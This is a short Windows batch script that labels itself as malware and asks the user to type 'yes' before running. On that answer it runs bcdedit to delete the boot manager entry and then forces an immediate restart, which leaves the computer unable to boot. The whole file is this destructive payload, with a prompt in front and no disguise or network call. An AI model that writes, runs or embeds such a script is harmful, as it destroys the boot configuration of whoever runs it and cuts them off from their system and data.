@echo off
set /p userChoice=THIS IS MALWARE, DO YOU WANT TO RUN (yes/no , say it exactly): 

if /i "%userChoice%"=="yes" (
    bcdedit /delete {bootmgr} /f
    shutdown /r /f
    pause
) else (
    echo Script stopped. Goodbye!
    pause
)
